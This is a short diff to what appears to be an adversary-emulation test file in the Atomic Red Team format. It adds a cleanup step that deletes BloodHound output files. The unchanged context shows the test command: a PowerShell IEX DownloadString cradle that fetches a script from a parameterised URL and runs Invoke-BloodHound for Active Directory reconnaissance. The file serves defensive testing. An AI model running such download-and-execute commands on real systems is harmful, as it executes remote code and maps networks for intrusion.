@@ -36,6 +36,8 @@ atomic_tests:
     elevation_required: false
     command: |
       powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{bloodurl}'); Invoke-BloodHound"
+    cleanup_command: |
+      Remove-Item $env:temp\*BloodHound.zip -Force
 
 - name: Obfuscation Tests
   description: |
